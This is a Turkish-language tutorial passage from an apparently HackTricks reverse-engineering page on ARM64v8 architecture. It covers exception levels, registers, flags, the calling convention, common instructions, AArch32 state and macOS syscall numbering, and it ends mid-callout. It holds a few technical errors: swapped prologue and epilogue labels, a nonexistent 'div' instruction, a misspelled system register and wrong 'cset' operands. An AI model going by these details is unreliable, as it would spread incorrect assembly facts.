# ARM64v8'ye Giriş

{{#include ../../../banners/hacktricks-training.md}}

## **Exception Levels - EL (ARM64v8)**

ARMv8 mimarisinde, Exception Levels (EL) olarak bilinen yürütme seviyeleri, yürütme ortamının ayrıcalık düzeyini ve yeteneklerini tanımlar. Dört istisna seviyesi vardır, EL0'dan EL3'e kadar, her biri farklı bir amaca hizmet eder:

1. **EL0 - User Mode**:
- Bu en az ayrıcalıklı seviyedir ve normal uygulama kodunun yürütülmesi için kullanılır.
- EL0'da çalışan uygulamalar birbirlerinden ve sistem yazılımından izole edilir; bu da güvenliği ve kararlılığı artırır.
2. **EL1 - Operating System Kernel Mode**:
- Çoğu işletim sistemi çekirdeği bu seviyede çalışır.
- EL1, EL0'dan daha fazla ayrıcalığa sahiptir ve sistem kaynaklarına erişebilir, ancak sistem bütünlüğünü sağlamak için bazı kısıtlamalar vardır.
3. **EL2 - Hypervisor Mode**:
- Bu seviye sanallaştırma için kullanılır. EL2'de çalışan bir hypervisor, aynı fiziksel donanım üzerinde birden fazla işletim sistemini (her biri kendi EL1'inde) yönetebilir.
- EL2, sanallaştırılmış ortamların izolasyonu ve kontrolü için özellikler sağlar.
4. **EL3 - Secure Monitor Mode**:
- Bu en ayrıcalıklı seviyedir ve genellikle secure boot ve trusted execution ortamları için kullanılır.
- EL3, secure ve non-secure durumlar arasındaki erişimleri (ör. secure boot, trusted OS vb.) yönetip kontrol edebilir.

Bu seviyelerin kullanımı, kullanıcı uygulamalarından en ayrıcalıklı sistem yazılımlarına kadar sistemin farklı yönlerini yapılandırılmış ve güvenli bir şekilde yönetmeyi sağlar. ARMv8'in ayrıcalık seviyelerine yaklaşımı, farklı sistem bileşenlerini etkili şekilde izole ederek sistemin güvenliğini ve sağlamlığını artırır.

## **Registers (ARM64v8)**

ARM64'te **31 genel amaçlı register** vardır; `x0` ile `x30` arası etiketlenmiştir. Her biri **64-bit** (8 bayt) değer tutabilir. Sadece 32-bit değerler gerektiren işlemler için, aynı registerlar `w0` ile `w30` isimleriyle 32-bit modunda erişilebilir.

1. **`x0`** ile **`x7`** - Genellikle scratch registerlar ve alt rutinlere parametre geçmek için kullanılır.
- **`x0`** ayrıca bir fonksiyonun döndürdüğü veriyi taşır.
2. **`x8`** - Linux çekirdeğinde, `x8` `svc` talimatı için system call numarası olarak kullanılır. **macOS'ta ise x16 kullanılır!**
3. **`x9`** ile **`x15`** - Daha fazla geçici register, genellikle lokal değişkenler için kullanılır.
4. **`x16`** ve **`x17`** - **Prosedür içi çağrı registerları**. Anlık değerler için geçici registerlardır. Ayrıca dolaylı fonksiyon çağrıları ve PLT stub'ları için kullanılırlar.
- **`x16`** macOS'ta **`svc`** talimatı için **system call numarası** olarak kullanılır.
5. **`x18`** - **Platform register'ı**. Genel amaçlı bir register olarak kullanılabilir, ancak bazı platformlarda bu register platforma özgü kullanım için ayrılmıştır: Windows'ta current thread environment block'a işaretçi veya Linux çekirdeğinde şu anda **yürütülen task structure**'a işaret etmek için.
6. **`x19`** ile **`x28`** - Bu registerlar callee-saved registerlardır. Bir fonksiyon, çağıran için bu registerların değerlerini korumalıdır; bu yüzden bunlar yığına (stack) kaydedilir ve geri çağırana dönmeden önce geri alınır.
7. **`x29`** - **Frame pointer**, yığın çerçevesini takip etmek için. Yeni bir stack frame oluşturulduğunda, **`x29`** register'ı **yeğe** kaydedilir ve yeni frame pointer adresi (yani **`sp`** adresi) bu register'a kaydedilir.
- Bu register aynı zamanda genellikle **local değişkenlere** referans olarak kullanıldığı için genel amaçlı bir register olarak da kullanılabilir.
8. **`x30`** veya **`lr`** - **Link register**. `BL` (Branch with Link) veya `BLR` (Branch with Link to Register) talimatı çalıştırıldığında dönüş adresini (pc değerini) bu register'a kaydeder.
- Diğer registerlar gibi kullanılabilir.
- Eğer mevcut fonksiyon yeni bir fonksiyon çağıracaksa ve dolayısıyla `lr` üzerine yazılacaksa, başlangıçta `lr` yığına kaydedilir; bu epilogdur (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` ve `lr`'yi kaydet, alan oluştur ve yeni `fp` ayarla) ve sonunda geri alınır; bu prologdur (`ldp x29, x30, [sp], #48; ret` -> `fp` ve `lr`'yi geri al ve dönüş).
9. **`sp`** - **Stack pointer**, yığının (stack) tepe noktasını takip etmek için kullanılır.
- **`sp`** değeri her zaman en az bir **quadword** **hizalamasına** (alignment) göre tutulmalıdır, aksi halde hizalama istisnası oluşabilir.
10. **`pc`** - **Program counter**, bir sonraki talimata işaret eder. Bu register yalnızca istisna üretimleri, istisna dönüşleri ve dallanmalar yoluyla güncellenebilir. Bu register'ı okuyabilen olağan talimatlar, adresi **`lr`**'ye kaydetmek için kullanılan branch with link talimatları (BL, BLR) ile sınırlıdır.
11. **`xzr`** - **Sıfır register'ı**. 32-bit formunda **`wzr`** olarak da adlandırılır. Sıfır değerini kolayca almak için (yaygın işlem) ya da **`subs`** gibi karşılaştırmalar yaparken (ör. **`subs XZR, Xn, #10`**) sonucu hiçbir yere kaydetmeden kullanılır (sonuç **`xzr`**'de yok sayılır).

**`Wn`** registerları **`Xn`** registerının **32bit** versiyonudur.

> [!TIP]
> X0 - X18 arasındaki registerlar volatildir; yani fonksiyon çağrıları ve kesintilerle değerleri değiştirilebilir. Ancak X19 - X28 arasındaki registerlar non-volatile'dır; bunların değerleri fonksiyon çağrıları boyunca korunmalıdır ("callee saved").

### SIMD ve Floating-Point Registerları

Ayrıca, optimize edilmiş single instruction multiple data (SIMD) işlemleri ve floating-point aritmetiği için kullanılabilen **128bit uzunluğunda 32 adet** register vardır. Bunlara Vn register'ları denir; ayrıca **64-bit, 32-bit, 16-bit ve 8-bit** modlarında çalıştırıldıklarında sırasıyla **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** ve **`Bn`** olarak adlandırılırlar.

### System Registerları

**Yüzlerce system register** (özel amaçlı registerlar, SPR) işlemcinin davranışını **izleme** ve **kontrol etme** için kullanılır.\
Bunlar yalnızca özel talimatlar **`mrs`** ve **`msr`** ile okunup yazılabilir.

Özel registerlar **`TPIDR_EL0`** ve **`TPIDDR_EL0`** tersine mühendislik sırasında sıkça karşılaşılan registerlardır. `EL0` eki, register'a hangi minimum istisna seviyesinden erişilebileceğini belirtir (bu örnekte EL0, normal programların çalıştığı düzenli istisna / ayrıcalık seviyesidir).\
Genellikle thread-local storage bölgesinin temel adresini depolamak için kullanılırlar. İlk olan genellikle EL0'da çalışan programlar için okunup yazılabilirken, ikincisi EL0'den okunabilir ve EL1'den yazılabilir (ör. kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE**, işletim sistemi tarafından görülebilen **`SPSR_ELx`** özel register'ında seri hale getirilmiş birkaç işlem bileşeni içerir; burada X tetiklenen istisnanın **izin (permission) seviyesi**dir (bu, istisna sona erdiğinde işlem durumunu geri almak için kullanılır).\
Erişilebilen alanlar şunlardır:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`** ve **`V`** koşul flag'leri:
- **`N`** işlemin negatif bir sonuç ürettiğini gösterir
- **`Z`** işlemin sıfır sonucu ürettiğini gösterir
- **`C`** işlemin taşıma (carry) olduğunu gösterir
- **`V`** işlemin işaretli taşma (signed overflow) ürettiğini gösterir:
- İki pozitif sayının toplamı negatif bir sonuç veriyorsa.
- İki negatif sayının toplamı pozitif bir sonuç veriyorsa.
- Çıkarmada, daha büyük negatif bir sayı daha küçük pozitif bir sayıdan çıkarıldığında (veya tersine) ve sonuç verilen bit boyutu içinde temsil edilemiyorsa.
- İşlemcinin işlemin işaretli mı işaretsiz mi olduğunu bilmediği açıktır, bu nedenle işlemlerde C ve V kontrol edilerek taşma olup olmadığı belirtilir.

> [!WARNING]
> Tüm talimatlar bu flag'leri güncellemez. Bazıları (ör. **`CMP`** veya **`TST`**) günceller, ve **s** suffix'i olanlar (**`ADDS`** gibi) da bu flag'leri günceller.

- Mevcut **register genişliği (`nRW`) flag'i**: Eğer flag 0 ise, program yeniden başlatıldığında AArch64 yürütme durumunda çalışacaktır.
- Mevcut **Exception Level** (**`EL`**): EL0'da çalışan normal bir program için bu değer 0 olacaktır.
- **Single stepping** flag'i (**`SS`**): Debugger'lar tarafından, bir istisna yoluyla **`SPSR_ELx`** içine SS flag'i 1 yapılarak tek adım yürütme için kullanılır. Program bir adım çalıştırır ve tek adım istisnası oluşturur.
- **Illegal exception** durum flag'i (**`IL`**): Ayrıcalıklı bir yazılım geçersiz bir istisna seviyesi transferi yaptığında işaretlenir; bu flag 1 olarak ayarlanır ve işlemci illegal state istisnası tetikler.
- **`DAIF`** flag'leri: Bu flag'ler ayrıcalıklı bir programın belirli dış istisnaları seçici olarak maskelenmesine izin verir.
- Eğer **`A`** 1 ise asenkron abort'lar tetiklenecektir. **`I`** harici donanım Interrupt Requests (IRQ) ile nasıl yanıt verileceğini yapılandırır. **F** ise Fast Interrupt Requests (FIQ) ile ilgilidir.
- **Stack pointer select** flag'leri (**`SPS`**): EL1 ve üstünde çalışan ayrıcalıklı programlar, kendi stack pointer register'ları ile user-model olan arasında geçiş yapabilirler (örn. `SP_EL1` ile `EL0` arasında). Bu geçiş **`SPSel`** özel register'ına yazılarak yapılır. Bu EL0'dan yapılamaz.

## **Calling Convention (ARM64v8)**

ARM64 calling convention, bir fonksiyona iletilen ilk sekiz parametrenin `x0` ile `x7` registerlarında geçirileceğini belirtir. Ek parametreler yığına (stack) geçirilir. Döndürülen değer register `x0`'da döndürülür; eğer 128 bit ise ayrıca `x1` de kullanılır. `x19` ile `x30` ve `sp` registerları fonksiyon çağrıları arasında korunmalıdır.

Assembly'de bir fonksiyonu okurken, **function prologue** ve **epilogue**'a bakın. **Prologue** genellikle **frame pointer (`x29`)** kaydetmeyi, yeni bir frame pointer ayarlamayı ve yığında alan ayırmayı içerir. **Epilogue** ise genellikle kaydedilmiş frame pointer'ı geri yüklemeyi ve fonksiyondan dönmeyi içerir.

### Calling Convention in Swift

Swift kendi **calling convention**'ına sahiptir; detaylar şurada bulunabilir: [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

ARM64 talimatları genel olarak **`opcode dst, src1, src2`** formatına sahiptir; burada **`opcode`** yapılacak işlemi (ör. `add`, `sub`, `mov` vb.), **`dst`** sonucu depolayacak hedef register'ı ve **`src1`**, **`src2`** kaynak register'larıdır. Immediate değerler kaynak registerların yerine kullanılabilir.

- **`mov`**: Bir değeri bir registerdan diğerine **taşır**.
- Örnek: `mov x0, x1` — `x1`'deki değeri `x0`'a taşır.
- **`ldr`**: Bellekten bir değeri bir registera **yükler**.
- Örnek: `ldr x0, [x1]` — `x1`'in işaret ettiği bellek konumundan değeri `x0`'a yükler.
- **Offset mode**: Orijin pointer'ını etkileyen bir offset belirtilir, örneğin:
- `ldr x2, [x1, #8]` — bu x1 + 8 adresinden değeri x2'ye yükler
- `ldr x2, [x0, x1, lsl #2]` — bu x2'ye x0 dizisinden x1 (index) * 4 pozisyonundaki nesneyi yükler
- **Pre-indexed mode**: Bu mod orijine hesaplamaları uygulayıp sonucu alır ve ayrıca yeni orijini orijine yazar.
- `ldr x2, [x1, #8]!` — bu `x1 + 8`'i `x2`'ye yükler ve `x1`'e `x1 + 8` sonucunu yazar
- `str lr, [sp, #-4]!` — Link register'ı sp'ye kaydeder ve sp'yi günceller
- **Post-index mode**: Öncekine benzer, ancak bellek adresine önce erişilir, sonra offset hesaplanıp saklanır.
- `ldr x0, [x1], #8` — `x1`'i `x0`'e yükler ve `x1`'i `x1 + 8` ile günceller
- **PC-relative addressing**: Yüklenecek adres PC registerına göre hesaplanır
- `ldr x1, =_start` — bu mevcut PC'ye göre `_start` sembolünün başladığı adresi x1'e yükler.
- **`str`**: Bir registerdaki değeri belleğe **yazar**.
- Örnek: `str x0, [x1]` — `x0`'daki değeri `x1`'in işaret ettiği bellek konumuna yazar.
- **`ldp`**: İki registerı **ardışık bellek** konumlarından **yükler**. Bellek adresi genellikle başka bir register değeri ile offset eklenerek oluşturulur.
- Örnek: `ldp x0, x1, [x2]` — `x2` ve `x2 + 8` adreslerinden sırasıyla `x0` ve `x1`'i yükler.
- **`stp`**: İki registerı **ardışık bellek** konumlarına **yazar**. Bellek adresi genellikle başka bir register ile offset eklenerek oluşturulur.
- Örnek: `stp x0, x1, [sp]` — `x0` ve `x1`'i `sp` ve `sp + 8` adreslerine yazar.
- `stp x0, x1, [sp, #16]!` — `x0` ve `x1`'i `sp+16` ve `sp+24` adreslerine yazar ve `sp`'yi `sp+16` ile günceller.
- **`add`**: İki registerın değerini toplar ve sonucu bir registera yazar.
- Söz dizimi: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Hedef
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (register veya immediate)
- \[shift #N | RRX] -> Bir shift uygula veya RRX kullan
- Örnek: `add x0, x1, x2` — `x1` ve `x2`'deki değerleri toplar ve sonucu `x0`'a yazar.
- `add x5, x5, #1, lsl #12` — bu 4096'ya eşittir (1'i 12 kez sola kaydırmak) -> 1 0000 0000 0000 0000
- **`adds`**: `add` yapar ve flag'leri günceller.
- **`sub`**: İki registerın farkını alır ve sonucu bir registera yazar.
- `add` söz dizimini kontrol edin.
- Örnek: `sub x0, x1, x2` — `x1`'den `x2`'yi çıkarır ve sonucu `x0`'a yazar.
- **`subs`**: Flag'leri güncelleyerek sub yapar.
- **`mul`**: İki registerın çarpımını alır ve sonucu bir registera yazar.
- Örnek: `mul x0, x1, x2` — `x1` ve `x2`'yi çarpar ve sonucu `x0`'a yazar.
- **`div`**: Bir registerın değerini diğerine böler ve sonucu bir registera yazar.
- Örnek: `div x0, x1, x2` — `x1`'i `x2`'ye böler ve sonucu `x0`'a yazar.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Diğer bitleri öne kaydırarak sondan 0 ekler (2 ile çarpma etkisi).
- **Logical shift right**: Diğer bitleri geriye kaydırarak başa 0 ekler (işaretsiz bölme ile ilişkilidir).
- **Arithmetic shift right**: `lsr` gibi, ancak en anlamlı bit 1 ise başa 1 ekler (işaretli bölme ile ilişkilidir).
- **Rotate right**: `lsr` gibi ama sağdan çıkarılan bitler sola eklenir.
- **Rotate Right with Extend**: `ror` gibi ama carry flag en anlamlı bit olarak kullanılır. Böylece carry flag bit 31'e taşınır ve çıkarılan bit carry flag'e konur.
- **`bfm`**: Bit Field Move; bu işlemler bir değerden `0...n` arası bitleri kopyalar ve onları `m..m+n` pozisyonlarına yerleştirir. **`#s`** en sol bit pozisyonunu ve **`#r`** rotate right miktarını belirtir.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Bir registerdan bitfield kopyalar ve başka bir registera yapıştırır.
- **`BFI X1, X2, #3, #4`** X2'den X1'in 3. bitinden itibaren 4 bit ekler
- **`BFXIL X1, X2, #3, #4`** X2'nin 3. bitinden itibaren dört bit çıkarır ve X1'e kopyalar
- **`SBFIZ X1, X2, #3, #4`** X2'den 4 biti işaret genişlemesi ile X1'e bit pozisyonu 3'ten başlayarak ekler ve sağdaki bitleri sıfırlar
- **`SBFX X1, X2, #3, #4`** X2'den 3. bitten başlayarak 4 bit çıkarır, işaret genişletir ve sonucu X1'e koyar
- **`UBFIZ X1, X2, #3, #4`** X2'den 4 biti sıfır genişlemesi ile X1'e ekler ve sağdaki bitleri sıfırlar
- **`UBFX X1, X2, #3, #4`** X2'den 3. bitten başlayarak 4 bit çıkarır ve sıfır genişletilmiş sonucu X1'e koyar.
- **Sign Extend To X:** Bir değerin işaretini genişletir (veya işaretsiz sürümünde sadece 0 ekler) böylece işlem yapabilsin:
- **`SXTB X1, W2`** W2'den bir byte'ın işaretini X1'e uzatır (`W2`, `X2`'nin yarısı) 64 biti doldurmak için
- **`SXTH X1, W2`** 16-bit bir sayının işaretini W2'den X1'e uzatır
- **`SXTW X1, W2`** W2'den bir word'ın işaretini X1'e uzatır
- **`UXTB X1, W2`** W2'den bir byte'ı X1'e sıfır genişlemesi ile koyar (unsigned)
- **`extr`**: Belirtilen iki registerın birleştirilmiş eşinden bitler çıkarır.
- Örnek: `EXTR W3, W2, W1, #3` Bu W1+W2'yi birleştirir ve W2'nin 3. bitinden W1'in 3. bitine kadar alıp W3'e koyar.
- **`cmp`**: İki registerı karşılaştırır ve koşul flag'lerini ayarlar. Bu, **`subs`**'in bir alias'ıdır ve hedef register'ı sıfır register'ına ayarlar. `m == n` bilgisini almak için kullanışlıdır.
- `subs` ile aynı söz dizimini destekler.
- Örnek: `cmp x0, x1` — `x0` ve `x1`'i karşılaştırır ve koşul flag'lerini ayarlar.
- **`cmn`**: Negatif karşılaştırma. Bu durumda **`adds`**'in alias'ıdır ve aynı söz dizimini destekler. `m == -n` kontrolü için kullanışlıdır.
- **`ccmp`**: Koşullu karşılaştırma; önceki karşılaştırma doğruysa gerçekleştirilir ve özellikle nzcv bitlerini ayarlar.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> eğer x1 != x2 ve x3 < x4 ise func'a atla
- Bunun nedeni, **`ccmp`** yalnızca önceki `cmp`'in `NE` olduğu durumda yürütülür; eğer değilse nzcv bitleri 0 olarak ayarlanır (bu da `blt` karşılaştırmasını sağlamaz).
- Bu ayrıca `ccmn` (aynı fakat negatif, `cmp` vs `cmn` gibi) olarak da kullanılabilir.
- **`tst`**: Karşılaştırılan değerlerin herhangi birinin 1 olup olmadığını kontrol eder (bir ANDS gibi çalışır ama sonucu hiçbir yere yazmaz). Bir register'ı bir değerle kontrol edip belirtilen bitlerden herhangi birinin 1 olup olmadığını test etmek için kullanışlıdır.
- Örnek: `tst X1, #7` X1'in son 3 bitinden herhangi biri 1 mi diye kontrol eder
- **`teq`**: Sonucu yok sayarak XOR işlemi yapar
- **`b`**: Koşulsuz Branch
- Örnek: `b myFunction`
- Bu, link register'ı dönüş adresiyle doldurmaz (geri dönmesi gereken alt rutin çağrıları için uygun değil)
- **`bl`**: Link ile Branch, bir alt rutini **çağırmak** için kullanılır. Döngü adresini `x30`'a kaydeder.
- Örnek: `bl myFunction` — `myFunction`'ı çağırır ve dönüş adresini `x30`'a kaydeder.
- **`blr`**: Register'a Branch with Link; hedef adres registerda belirtildiğinde alt rutini çağırmak için kullanılır. Döndürme adresini `x30`'a kaydeder.
- Örnek: `blr x1` — `x1`'deki adrese çağrı yapar ve dönüş adresini `x30`'a kaydeder.
- **`ret`**: Alt rutinden dönüş, tipik olarak `x30`'daki adresi kullanır.
- Örnek: `ret` — Mevcut alt rutininden `x30`'daki dönüş adresi ile döner.
- **`b.<cond>`**: Koşullu dallanmalar
- **`b.eq`**: Eşitse dallan (önceki `cmp`'e bağlı).
- Örnek: `b.eq label` — Eğer önceki `cmp` iki değeri eşit bulduysa `label`'a atlar.
- **`b.ne`**: Eşit değilse dallan. Bu talimat, koşul flag'lerini kontrol eder ve eğer karşılaştırılan değerler eşit değilse belirtilen etikete veya adrese dallanır.
- Örnek: `cmp x0, x1` sonrası `b.ne label` — Eğer `x0` ve `x1` eşit değilse `label`'a atlar.
- **`cbz`**: Sıfırla karşılaştır ve dallan. Bir registerı sıfırla karşılaştırır, eğer sıfırsa dallanır.
- Örnek: `cbz x0, label` — `x0` sıfırsa `label`'a atlar.
- **`cbnz`**: Sıfır olmayanla karşılaştır ve dallan. Bir registerı sıfırla karşılaştırır, eğer sıfır değilse dallanır.
- Örnek: `cbnz x0, label` — `x0` sıfır değilse `label`'a atlar.
- **`tbnz`**: Bit testi ve sıfır değilse dallan
- Örnek: `tbnz x0, #8, label`
- **`tbz`**: Bit testi ve sıfırsa dallan
- Örnek: `tbz x0, #8, label`
- **Koşullu seçim işlemleri**: Davranışı koşul bitlerine göre değişen işlemler.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Eğer true ise X0 = X1, değilse X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Eğer true ise Xd = Xn, değilse Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Eğer true ise Xd = Xn + 1, değilse Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Eğer true ise Xd = Xn, değilse Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Eğer true ise Xd = NOT(Xn), değilse Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Eğer true ise Xd = Xn, değilse Xd = - Xm
- `cneg Xd, Xn, cond` -> Eğer true ise Xd = - Xn, değilse Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Eğer true ise Xd = 1, değilse Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Eğer true ise Xd = \<all 1>, değilse Xd = 0
- **`adrp`**: Bir sembolün **sayfa adresini** hesaplar ve bir registera kaydeder.
- Örnek: `adrp x0, symbol` — `symbol`'ün sayfa adresini hesaplar ve `x0`'a koyar.
- **`ldrsw`**: Bellekten işaretli 32-bit bir değeri yükler ve **64-bit'e işaret genişletmesi** ile kaydeder.
- Örnek: `ldrsw x0, [x1]` — `x1`'in işaret ettiği bellekten işaretli 32-bit değeri yükler, 64-bit'e genişletir ve `x0`'a koyar.
- **`stur`**: Bir register değerini başka bir registerdan offset kullanarak bir bellek konumuna yazar.
- Örnek: `stur x0, [x1, #4]` — `x0`'daki değeri `x1`'in işaret ettiği adresin 4 bayt sonrasındaki adrese yazar.
- **`svc`**: System call yapmak için kullanılır. "Supervisor Call" anlamına gelir. Bu talimat çalıştırıldığında işlemci user modundan kernel moduna geçer ve kernel'in system call handling kodunun bulunduğu belirli bir bellek konumuna atlar.

- Örnek:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Link register ve frame pointer'ı yığına kaydet**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Yeni çerçeve işaretçisini ayarla**: `mov x29, sp` (geçerli fonksiyon için yeni çerçeve işaretçisini ayarlar)
3. **Yerel değişkenler için stack'te alan ayır (gerekirse)**: `sub sp, sp, <size>` (burada `<size>` gerekli bayt sayısıdır)

### **Fonksiyon Epilogu**

1. **Yerel değişkenler için ayrılan alanı geri al (varsa)**: `add sp, sp, <size>`
2. **link register'ı ve çerçeve işaretçisini geri yükle**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Dönüş**: `ret` (bağlantı kaydındaki adresi kullanarak kontrolü çağırana geri verir)

## AARCH32 Yürütme Durumu

Armv8-A, 32-bit programların yürütülmesini destekler. **AArch32** iki farklı **komut setinden** birinde çalışabilir: **`A32`** ve **`T32`** ve bunlar arasında **`interworking`** ile geçiş yapabilir.\
**Ayrıcalıklı** 64-bit programlar, daha düşük ayrıcalıklı 32-bit programların **yürütülmesini** daha düşük istisna seviyesine aktararak planlayabilir.\
64-bit'ten 32-bit'e geçişin daha düşük bir istisna seviyesiyle gerçekleştiğini unutmayın (örneğin EL1'deki bir 64-bit programın EL0'de bir programı tetiklemesi). Bu, `AArch32` işlem iş parçacığı yürütülmeye hazır olduğunda **`SPSR_ELx`** özel kaydının **bit 4'ünün 1 olarak** ayarlanmasıyla yapılır ve `SPSR_ELx`'in geri kalanı **`AArch32`** programının CPSR değerini saklar. Ardından ayrıcalıklı süreç **`ERET`** komutunu çağırır; böylece işlemci **`AArch32`**'ye geçer ve CPSR'ye bağlı olarak A32 veya T32'ye girer.**

**`interworking`** CPSR'nin J ve T bitleri kullanılarak gerçekleşir. `J=0` ve `T=0` **`A32`** anlamına gelir; `J=0` ve `T=1` ise **T32** anlamına gelir. Bu temelde komut setinin T32 olduğunu belirtmek için **en düşük bitin 1 olarak ayarlanması** demektir.\
Bu, **interworking branch instructions,** sırasında ayarlanır; ancak PC hedef kayıt olarak ayarlandığında diğer talimatlarla doğrudan da ayarlanabilir. Örnek:

Başka bir örnek:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Kayıtlar

16 adet 32-bit kayıt vardır (r0-r15). **r0 ile r14 arasında** herhangi bir işlem için kullanılabilirler, ancak bazıları genellikle ayrılmıştır:

- **`r15`**: Program counter (her zaman). Bir sonraki komutun adresini içerir. A32'de current + 8, T32'de current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Not: yığın her zaman 16-byte hizalıdır)
- **`r14`**: Link Register

Ayrıca kayıtlar **`banked registries`** içinde yedeklenir. Buralar, istisna işleme ve ayrıcalıklı işlemlerde **hızlı context switching** yapmayı sağlayan, kayıt değerlerini saklayan alanlardır; böylece her seferinde kayıtları elle kaydedip geri yükleme ihtiyacı ortadan kalkar.\
Bu, istisna alınan işlemci modunun durumunun **`CPSR`**'den **`SPSR`**'ye kaydedilmesiyle yapılır. İstisna dönüşlerinde, **`CPSR`** **`SPSR`**'den geri yüklenir.

### CPSR - Current Program Status Register

AArch32'de CPSR, AArch64'teki **`PSTATE`**'e benzer şekilde çalışır ve bir istisna alındığında daha sonra yürütmeyi geri yüklemek için **`SPSR_ELx`** içinde de saklanır:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Alanlar birkaç gruba ayrılır:

- Application Program Status Register (APSR): Aritmetik bayraklar ve EL0'dan erişilebilir
- Execution State Registers: İşlemci davranışı (OS tarafından yönetilir).

#### Application Program Status Register (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** bayrakları (AArch64'teki gibi)
- **`Q`** bayrağı: Özel saturating aritmetik talimatlarının yürütülmesi sırasında **integer saturation** oluştuğunda 1 olarak ayarlanır. Bir kez **`1`** olduğunda, elle 0 olarak ayarlanana kadar değeri korunur. Ayrıca, bu bayrağın değerini dolaylı olarak kontrol eden herhangi bir talimat yoktur; değeri manuel olarak okunmalıdır.
- **`GE`** (Greater than or equal) Bayrakları: SIMD (Single Instruction, Multiple Data) işlemlerinde kullanılır; örneğin "parallel add" ve "parallel subtract" gibi. Bu işlemler bir talimatla birden çok veri noktasını işlemeye izin verir.

Örneğin, **`UADD8`** talimatı iki 32-bit operandın dört çift baytını paralel olarak toplar ve sonuçları bir 32-bit kayıtta saklar. Daha sonra bu sonuçlara göre **`APSR`** içindeki `GE` bayraklarını ayarlar. Her bir GE bayrağı, o bayt çifti için yapılan toplamanın **taşma** yapıp yapmadığını gösterir.

**`SEL`** talimatı bu GE bayraklarını kullanarak koşullu işlemler yapar.

#### Execution State Registers

- **`J`** ve **`T`** bitleri: **`J`** 0 olmalıdır; **`T`** 0 ise A32 instruction set kullanılır, 1 ise T32 kullanılır.
- IT Block State Register (`ITSTATE`): 10-15 ve 25-26 bitleridir. **`IT`** önekli bir grup içindeki talimatlar için koşulları saklar.
- **`E`** biti: **endianness**'i gösterir.
- Mode ve Exception Mask Bitleri (0-4): Geçerli yürütme durumunu belirler. 5. bit, programın 32bit olarak çalışıp çalışmadığını gösterir (1 ise 32bit, 0 ise 64bit). Diğer 4 bit, şu anda kullanılan **istisna modunu** temsil eder (bir istisna meydana geldiğinde ve işlenirken). Ayarlı olan sayı, bu istisna işlenirken başka bir istisna tetiklenirse mevcut önceliği belirtir.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Belirli istisnalar **`A`**, `I`, `F` bitleri kullanılarak devre dışı bırakılabilir. Eğer **`A`** 1 ise **asynchronous aborts** tetiklenecektir. **`I`** dış donanımdan gelen **Interrupt Requests** (IRQ) ile yanıt vermeyi yapılandırır. `F` ise **Fast Interrupt Requests** (FIQ) ile ilişkilidir.

## macOS

### BSD syscalls

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) dosyasına bakın veya `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` komutunu çalıştırın. BSD syscalls'lar **x16 > 0** olacaktır.

### Mach Traps

`syscall_sw.c` içindeki [**mach_trap_table**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) ve [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) içindeki prototiplere bakın. Mach traps'un mex numarası `MACH_TRAP_TABLE_COUNT` = 128'dir. Mach traps'lar **x16 < 0** olacaktır, bu yüzden önceki listedeki numaraları bir **eksi** ile çağırmanız gerekir: **`_kernelrpc_mach_vm_allocate_trap`** **`-10`**'dur.

Bu (ve BSD) syscalls'ların nasıl çağrılacağını bulmak için bir disassembler içinde **`libsystem_kernel.dylib`**'a da bakabilirsiniz:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
